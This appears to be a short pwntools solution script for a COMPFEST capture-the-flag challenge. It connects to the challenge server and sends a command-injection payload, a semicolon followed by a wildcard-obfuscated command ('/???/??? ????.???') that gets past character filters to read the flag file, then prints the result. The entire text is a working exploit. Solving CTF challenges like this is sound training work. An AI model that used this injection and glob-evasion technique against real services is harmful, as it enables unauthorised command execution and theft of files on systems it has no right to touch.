from pwn import remote

r = remote('challenges.ctf.compfest.id', 20014)
r.sendlineafter(b'Gimme your input: ', b"; /???/??? ????.???")
recv = r.recvline_contains('COMPFEST').strip().decode()
r.close()
print('flag: ' + recv)